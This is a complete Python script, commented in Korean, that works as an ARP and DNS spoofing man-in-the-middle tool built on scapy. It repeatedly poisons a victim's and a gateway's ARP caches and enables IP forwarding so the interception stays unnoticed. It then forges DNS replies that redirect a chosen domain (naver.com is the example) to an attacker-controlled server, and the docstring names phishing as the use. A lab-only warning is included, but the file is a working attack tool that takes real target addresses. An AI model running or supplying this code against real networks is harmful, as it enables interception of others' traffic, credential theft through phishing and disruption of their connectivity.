#!/usr/bin/env python3
"""
ARP + DNS 스푸핑 (MITM) 테스터. (Linux / Windows 공용)

ARP 스푸핑으로 피해자↔게이트웨이 사이에 끼어든 뒤(MITM),
피해자의 DNS 질의를 가로채 위조 응답을 먼저 보내 원하는 IP로 유도한다.
(그 '원하는 IP'에 진짜처럼 생긴 페이지를 올리면 피싱이 된다 — 반드시 랩에서만)

요구:
  - Linux:   root, scapy (pip install scapy)
  - Windows: 관리자 권한, scapy, Npcap 설치('WinPcap API-compatible Mode' 체크).
             scapy가 Npcap으로 L2 프레임을 직접 주입하므로 윈도우 raw 소켓 제한을 우회한다.

반드시 본인이 통제하는 '격리된 랩 네트워크'(host-only/internal)에서만 사용할 것.
같은 네트워크의 타인 트래픽을 가로채는 것은 불법이다.
"""
import os
import sys
import ctypes
import threading
import subprocess
from dataclasses import dataclass

try:
    from scapy.all import (ARP, Ether, IP, UDP, DNS, DNSRR, DNSQR,
                           srp, send, sendp, sniff, conf, get_if_addr)
except ImportError:
    print("[!] scapy가 필요합니다: pip install scapy")
    sys.exit(1)

# ── 설정 (튜닝만 여기서. 대상 정보는 실행 시 input으로 받음) ──
ARP_INTERVAL = 2         # ARP 재감염 주기(초) — 캐시가 원상복구되기 전에 계속 덮음
DNS_TTL = 300            # 위조 응답의 TTL
VERBOSE_QUERIES = True   # True면 매칭 안 된 피해자 DNS 질의도 [?]로 표시 (디버깅용)

STOP = threading.Event()  # 협조적 종료 신호 (스레드·sniff 공유)


@dataclass
class Target:
    """공격 대상/환경 한 묶음. ask_inputs()가 채우고 이후 함수들이 공유한다."""
    iface: object            # scapy 인터페이스 객체
    victim_ip: str
    gateway_ip: str
    spoof_map: dict          # {도메인: 가짜IP}
    victim_mac: str = ""     # resolve_macs()가 채움
    gw_mac: str = ""


# ── 권한 / 환경 ──────────────────────────────────────
def is_admin():
    """root(리눅스) 또는 관리자(윈도우) 권한인지 확인."""
    if os.name == "posix":
        return hasattr(os, "geteuid") and os.geteuid() == 0
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def set_ip_forward(enable, iface=None):
    """IP 포워딩 on/off. 켜야 MITM 중에도 피해자 트래픽이 정상 흐름(눈치 못 챔).
    Linux는 /proc, Windows는 PowerShell(Set-NetIPInterface)로 해당 인터페이스에 설정."""
    if os.name == "posix":
        value = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(value)
            print(f"[*] IP forwarding {'ON' if enable else 'OFF'}")
        except OSError:
            subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=False)
        return

    # Windows
    state = "Enabled" if enable else "Disabled"
    try:
        interface_ip = get_if_addr(iface or conf.iface)
        ps_command = (
            f"$addr = Get-NetIPAddress -IPAddress '{interface_ip}' "
            f"-AddressFamily IPv4 -ErrorAction Stop; "
            f"Set-NetIPInterface -InterfaceIndex $addr.InterfaceIndex "
            f"-AddressFamily IPv4 -Forwarding {state}"
        )
        subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", ps_command],
            check=True,
        )
        print(f"[*] IP forwarding {'ON' if enable else 'OFF'} ({interface_ip})")
    except Exception as e:
        print(f"[!] IP forwarding 설정 실패: {e}")


# ── ARP ──────────────────────────────────────────────
def get_mac(ip):
    """ARP 요청으로 대상 IP의 MAC 주소를 알아낸다. 실패하면 None."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, retry=2, verbose=0)
    for _, r in ans:
        return r.hwsrc
    return None


def _arp_send(target_ip, target_mac, as_ip, as_mac=None, count=1):
    """target에게 'as_ip는 as_mac(생략 시 내 MAC)의 것'이라고 ARP is-at 전송.
    sendp(L2) + Ether(dst=target_mac)로 유니캐스트 → '목적지 MAC 미지정' 경고 없음."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=as_ip)
    if as_mac:
        pkt.hwsrc = as_mac            # 복구 시: 진짜 MAC을 명시
    sendp(Ether(dst=target_mac) / pkt, count=count, verbose=0)


def poison(cfg: "Target"):
    """피해자·게이트웨이를 한 번씩 감염 — 서로의 IP가 '내 MAC'이라고 속인다."""
    _arp_send(cfg.victim_ip, cfg.victim_mac, cfg.gateway_ip)   # 피해자에게: 게이트웨이=나
    _arp_send(cfg.gateway_ip, cfg.gw_mac, cfg.victim_ip)       # 게이트웨이에게: 피해자=나


def restore(cfg: "Target"):
    """원래 MAC으로 양쪽 ARP 캐시 복구 (종료 시 필수 — 안 하면 피해자 네트워크 끊김)."""
    _arp_send(cfg.victim_ip, cfg.victim_mac, cfg.gateway_ip, cfg.gw_mac, count=5)
    _arp_send(cfg.gateway_ip, cfg.gw_mac, cfg.victim_ip, cfg.victim_mac, count=5)


def spoof_loop(cfg: "Target"):
    """[스레드] ARP_INTERVAL마다 재감염해 MITM 위치를 유지한다."""
    while not STOP.is_set():
        poison(cfg)
        STOP.wait(ARP_INTERVAL)       # 대기 중 STOP 오면 즉시 깸


# ── DNS 위조 ─────────────────────────────────────────
def _send_forged(pkt, fake_ip):
    """피해자 질의(pkt)에 대한 위조 DNS 응답을 만들어 쏜다.
    txid·질문부·포트를 그대로 되비춰 피해자가 받아들이게 한다."""
    send(IP(dst=pkt[IP].src, src=pkt[IP].dst) /
         UDP(dport=pkt[UDP].sport, sport=53) /
         DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1, qd=pkt[DNS].qd,
             an=DNSRR(rrname=pkt[DNSQR].qname, ttl=DNS_TTL, rdata=fake_ip)),
         verbose=0)


def dns_callback(pkt, cfg: "Target"):
    """피해자의 DNS 질의 중 spoof_map에 걸리는 도메인이면 위조 응답을 보낸다."""
    if not (pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt.haslayer(UDP)):
        return
    if pkt[IP].src != cfg.victim_ip:       # 피해자가 보낸 질의만
        return

    qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
    for domain, fake_ip in cfg.spoof_map.items():
        if domain in qname:
            _send_forged(pkt, fake_ip)
            print(f"[+] 스푸핑: {qname} → {fake_ip}")
            return

    if VERBOSE_QUERIES:                    # 매칭 안 된 질의도 보고 싶을 때(디버깅)
        print(f"[?] 질의(비매칭): {qname}")


# ── 입력 ─────────────────────────────────────────────
def pick_iface():
    """인터페이스 목록을 번호로 보여주고 고르게 한다.
    번호가 기본이고 이름/IP 문자열도 매칭된다. 엔터는 scapy 기본값."""
    ifaces = list(conf.ifaces.values())

    print("\n=== 사용 가능한 인터페이스 ===")
    for i, ifc in enumerate(ifaces):
        name = getattr(ifc, "name", "") or getattr(ifc, "description", "") or "?"
        ip = getattr(ifc, "ip", "") or "-"
        print(f"  [{i:>2}] {name}  (IP: {ip})")
    print("  (엔터 = 자동 선택 / 번호·이름·IP 입력 가능)")

    sel = input("인터페이스 번호 선택: ").strip()
    if not sel:
        return conf.iface

    if sel.isdigit():                      # 번호로 선택
        idx = int(sel)
        if 0 <= idx < len(ifaces):
            return ifaces[idx]
        print(f"[!] 번호 범위를 벗어남: {sel} (0~{len(ifaces) - 1})")
        sys.exit(1)

    attrs = ("name", "description", "network_name", "ip")   # 이름/IP 문자열 (정확→부분)
    for exact in (True, False):
        for ifc in ifaces:
            fields = [str(getattr(ifc, a, "") or "") for a in attrs]
            if exact and sel in fields:
                return ifc
            if not exact and any(sel.lower() in f.lower() for f in fields if f):
                return ifc

    print(f"[!] '{sel}' 에 맞는 인터페이스가 없다.")
    sys.exit(1)


def ask_inputs() -> "Target":
    """실행 시 대상 정보를 input으로 받아 Target을 만든다 (MAC은 아직 빈 값).
    가짜 서버 IP는 피싱 서버가 이 머신에 있으면 '이 머신 IP'를 기본값으로 제안한다."""
    iface = pick_iface()
    conf.iface = iface                     # 이후 get_if_addr/송수신 기준

    try:
        my_ip = get_if_addr(conf.iface)
    except Exception:
        my_ip = ""
    if my_ip in ("", "0.0.0.0"):
        my_ip = ""

    victim_ip = input("피해자(타겟) IP: ").strip()
    gateway_ip = input("게이트웨이 IP: ").strip()
    domain = input("스푸핑할 도메인 (예: naver.com): ").strip()

    prompt = "가짜 서버 IP (리다이렉트 대상)"
    if my_ip:
        prompt += f" [엔터=이 머신 {my_ip}]"
    fake_ip = input(prompt + ": ").strip() or my_ip

    if not (victim_ip and gateway_ip and domain and fake_ip):
        print("[!] 피해자 IP·게이트웨이 IP·도메인·가짜 서버 IP는 모두 입력해야 합니다.")
        sys.exit(1)

    return Target(iface=iface, victim_ip=victim_ip, gateway_ip=gateway_ip,
                  spoof_map={domain: fake_ip})


def resolve_macs(cfg: "Target"):
    """피해자·게이트웨이 MAC을 조회해 cfg에 채운다. 실패하면 종료."""
    print(f"[*] 공격자(이 머신) MAC: {getattr(conf.iface, 'mac', '?')}"
          f"  ← 피해자 'arp -a'의 게이트웨이 MAC이 이거면 poison 성공")
    print(f"[*] MAC 조회 중... (iface={cfg.iface})")
    cfg.victim_mac = get_mac(cfg.victim_ip)
    cfg.gw_mac = get_mac(cfg.gateway_ip)
    if not cfg.victim_mac or not cfg.gw_mac:
        print(f"[!] MAC 조회 실패 — IP/인터페이스 확인 "
              f"(victim={cfg.victim_mac}, gw={cfg.gw_mac})")
        sys.exit(1)
    print(f"[*] 피해자 {cfg.victim_ip} ({cfg.victim_mac}) / "
          f"게이트웨이 {cfg.gateway_ip} ({cfg.gw_mac})")


# ── 메인 ─────────────────────────────────────────────
def main():
    if not is_admin():
        hint = "sudo python3 Dns_Spoof.py" if os.name == "posix" else "관리자 권한(Run as administrator)으로 실행"
        print(f"[!] root/관리자 권한 필요: {hint}")
        sys.exit(1)

    cfg = ask_inputs()
    resolve_macs(cfg)

    set_ip_forward(True, cfg.iface)
    threading.Thread(target=spoof_loop, args=(cfg,), daemon=True).start()
    print("[*] ARP 스푸핑 시작. DNS 질의 대기 중... (중단: Ctrl+C)")
    for d, fip in cfg.spoof_map.items():
        print(f"[*] 스푸핑: {d} → {fip}")

    try:
        sniff(iface=cfg.iface, filter=f"udp port 53 and src host {cfg.victim_ip}",
              prn=lambda pkt: dns_callback(pkt, cfg),
              store=0, stop_filter=lambda _: STOP.is_set())
    except KeyboardInterrupt:
        pass
    finally:
        print("\n[*] 종료 — ARP 캐시 복구 중...")
        STOP.set()
        restore(cfg)
        set_ip_forward(False, cfg.iface)
        print("[*] 완료")


if __name__ == "__main__":
    main()
